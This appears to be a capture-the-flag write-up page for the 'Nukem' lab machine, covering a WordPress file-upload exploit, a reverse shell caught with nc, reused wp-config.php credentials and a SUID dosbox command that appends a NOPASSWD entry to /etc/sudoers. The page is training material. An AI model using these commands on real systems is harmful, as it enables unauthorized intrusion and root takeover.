@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nukem &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Nukem</h1>
+    <div class="meta">Target: <code>192.168.183.105</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">WordPress</span><span class="tag">FileUpload</span><span class="tag">CVE</span><span class="tag">CredentialReuse</span><span class="tag">SUID</span><span class="tag">dosbox</span><span class="tag">GTFOBins</span><span class="tag">sudoers</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#wordpress-enumeration">WordPress Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#simple-file-list-4-2-2-arbitrary-file-upload">Simple File List 4.2.2, Arbitrary File Upload</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#wp-config-php-credentials-commander">wp-config.php Credentials → commander</a><a class="lvl3" href="#suid-dosbox-arbitrary-sudoers-write">SUID dosbox → Arbitrary Sudoers Write</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Nukem runs a WordPress site with the Simple File List plugin (version 4.2.2) installed, which has a known arbitrary file upload vulnerability. Getting a shell as <code>http</code> leads to database credentials in <code>wp-config.php</code> that are reused by a system user. That user has a SUID <code>dosbox</code> binary, an unusual escalation path where GTFOBins' unauthorized file write entry lets the sudoers file be appended directly, granting unrestricted sudo.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-generator: WordPress 5.5.1
+3306/tcp open  mysql
+5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
+</code></pre>
+<p>Port 3306 rejected external connections (<code>Host not allowed to connect</code>). Port 5000 returned 404 for every request. The WordPress site on port 80 was the attack surface.</p>
+<h3 id="wordpress-enumeration">WordPress Enumeration</h3>
+<pre><code class="language-sh">gobuster dir -u http://192.168.183.105/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/wordpress            (Status: 301)
+/wp-admin             (Status: 301)
+/wp-content           (Status: 301)
+/wp-includes          (Status: 301)
+</code></pre>
+<p>WPScan revealed the <code>/uploads</code> directory was listable. Browsing it showed an entry for the <strong>Simple File List</strong> plugin.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="simple-file-list-4-2-2-arbitrary-file-upload">Simple File List 4.2.2, Arbitrary File Upload</h3>
+<p>Simple File List 4.2.2 is vulnerable to arbitrary file upload (Exploit-DB 48979). The plugin accepts file uploads for an end-user file browser but performs insufficient validation, allowing PHP files to be uploaded. The exploit script automates the upload and rename steps:</p>
+<blockquote>
+<p><strong>How the exploit works:</strong> Simple File List validates file extensions on the initial upload but then performs a separate rename operation. The exploit uploads a PHP file disguised as an image and exploits the rename step to restore the <code>.php</code> extension, landing the file in a web-accessible path. Once the PHP file is accessible through the web root, visiting its URL triggers execution.</p>
+</blockquote>
+<p>I modified the payload to point to Kali:80 and changed the Python string quoting for clean execution:</p>
+<pre><code class="language-sh">python3 sfl.py http://192.168.183.105
+[ ] File 5567.png generated with password: ‹redacted›
+[ ] File uploaded at http://192.168.183.105/wp-content/uploads/simple-file-list/5567.png
+[ ] File moved to http://192.168.183.105/wp-content/uploads/simple-file-list/5567.php
+[+] Exploit seem to work.
+</code></pre>
+<p>Visited the PHP file:</p>
+<pre><code>http://192.168.183.105/wp-content/uploads/simple-file-list/5567.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.105] 36642
+uid=33(http) gid=33(http) groups=33(http)
+[http@nukem /]$ whoami
+http
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-sh">[http@nukem commander]$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="wp-config-php-credentials-commander">wp-config.php Credentials → commander</h3>
+<p>LinPEAS recovered database credentials from <code>wp-config.php</code>:</p>
+<pre><code>commander:‹redacted›
+</code></pre>
+<p>The password worked for the system user <code>commander</code> via <code>su</code>:</p>
+<pre><code class="language-sh">su commander
+Password: ‹redacted›
+</code></pre>
+<h3 id="suid-dosbox-arbitrary-sudoers-write">SUID dosbox → Arbitrary Sudoers Write</h3>
+<p>A SUID binary was present at <code>/usr/bin/dosbox</code>. GTFOBins lists <code>dosbox</code> under unauthorized file writes: it can mount the host filesystem and redirect shell output into files owned by root, because <code>dosbox</code> runs as root via the SUID bit and its shell redirection respects the effective UID.</p>
+<blockquote>
+<p><strong>Why dosbox write escalates to sudo:</strong> appending to <code>/etc/sudoers</code> with valid sudo syntax grants the named user arbitrary command execution as root without a password. The line <code>commander ALL=(ALL) NOPASSWD: ALL</code> placed in sudoers by a root-owned process takes effect immediately for the next <code>sudo</code> invocation.</p>
+</blockquote>
+<pre><code class="language-sh">LFILE='/etc/sudoers'
+/usr/bin/dosbox -c 'mount c /' -c &quot;echo commander ALL=(ALL) NOPASSWD: ALL &gt;&gt; c:$LFILE&quot; -c exit
+</code></pre>
+<p>DOSBox mounted <code>/</code> as its C drive, then appended the sudoers line through the redirected shell output. The ALSA and audio errors in the output are noise, the file write succeeds regardless:</p>
+<pre><code>SHELL:Redirect output to c:/etc/sudoers
+</code></pre>
+<p>With the sudoers entry in place:</p>
+<pre><code class="language-sh">sudo /bin/bash
+[root@nukem /]# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">[root@nukem ~]# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>WPScan's directory listing detection surfaces plugin paths that gobuster misses.</strong> The Simple File List plugin was found through the listable uploads directory, not through a name-based plugin scan.</li>
+<li><strong><code>wp-config.php</code> is the first credential source to check after any WordPress shell.</strong> Database passwords routinely get reused on system accounts.</li>
+<li><strong>SUID binaries that can write to arbitrary files are as powerful as SUID shells.</strong> A write to <code>/etc/sudoers</code> with valid syntax is permanent privilege escalation; <code>dosbox</code> with SUID achieves this cleanly through its filesystem mounting and shell redirect features.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
